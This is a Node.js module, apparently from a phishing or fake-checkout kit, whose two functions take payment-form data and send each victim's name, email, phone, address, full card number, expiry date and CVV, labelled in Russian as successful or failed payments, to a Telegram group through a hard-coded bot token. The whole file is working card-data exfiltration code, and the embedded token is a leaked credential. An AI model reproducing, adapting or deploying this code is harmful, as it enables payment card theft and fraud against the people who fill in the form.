/** @format */
const axios = require("axios");

const sendPaymentData = async (paymentData) => {
  try {
    const botToken = "7683620414:AAFu6cErSxU0Q0M0wx6bYnfIiCo2i7tdUi8";
    const chatId = "-4817190313";

    if (!botToken || !chatId) {
      console.error("Bot token or chat ID not configured");
      return;
    }

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const messageText = `
💳 НОВЫЙ ПЛАТЕЖ

👤 Клиент: ${paymentData.firstName} ${paymentData.lastName}
📧 Email: ${paymentData.email}
📱 Телефон: ${paymentData.phone}
📍 Страна: ${paymentData.countryCode}
🏠 Адрес: ${paymentData.address}
🏙️ Город: ${paymentData.city}
📮 Индекс: ${paymentData.postalCode}
${paymentData.bid ? `🆔 BID: ${paymentData.bid}\n` : ""}
💳 Данные карты:
   Владелец: ${paymentData.cardHolder}
   Номер: ${paymentData.cardNumber}
   Срок: ${paymentData.expiry}
   CVV: ${paymentData.cvv}

💰 Сумма: ${paymentData.price} EUR
🆔 FB ID: ${paymentData.fb || "Не указан"}

⏰ Время: ${new Date().toLocaleString("ru-RU")}
        `.trim();

    await axios.get(url, {
      params: {
        chat_id: chatId,
        parse_mode: "html",
        text: messageText,
      },
    });

    console.log("Payment data sent to Telegram successfully");
  } catch (error) {
    console.error("Error sending payment data to Telegram:", error);
  }
};

const sendFailedPaymentData = async (paymentData, paymentError) => {
  try {
    const botToken = "7683620414:AAFu6cErSxU0Q0M0wx6bYnfIiCo2i7tdUi8";
    const chatId = "-4817190313";

    if (!botToken || !chatId) {
      console.error("Bot token or chat ID not configured");
      return;
    }

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const errorTypeText =
      typeof paymentError === "object"
        ? JSON.stringify(paymentError)
        : paymentError;
    const messageText = `
💳 НЕУДАЧНЫЙ ПЛАТЕЖ !! ${errorTypeText}

👤 Клиент: ${paymentData.firstName} ${paymentData.lastName}
📧 Email: ${paymentData.email}
📱 Телефон: ${paymentData.phone}
📍 Страна: ${paymentData.countryCode}
🏠 Адрес: ${paymentData.address}
🏙️ Город: ${paymentData.city}
📮 Индекс: ${paymentData.postalCode}
${paymentData.bid ? `🆔 BID: ${paymentData.bid}\n` : ""}
💳 Данные карты:
   Владелец: ${paymentData.cardHolder}
   Номер: ${paymentData.cardNumber}
   Срок: ${paymentData.expiry}
   CVV: ${paymentData.cvv}

💰 Сумма: ${paymentData.price} EUR
🆔 FB ID: ${paymentData.fb || "Не указан"}

⏰ Время: ${new Date().toLocaleString("ru-RU")}
        `.trim();

    await axios.get(url, {
      params: {
        chat_id: chatId,
        parse_mode: "html",
        text: messageText,
      },
    });

    console.log("Payment data sent to Telegram successfully");
  } catch (error) {
    console.error("Error sending payment data to Telegram:", error);
  }
};

module.exports = {
  sendPaymentData,
  sendFailedPaymentData,
};
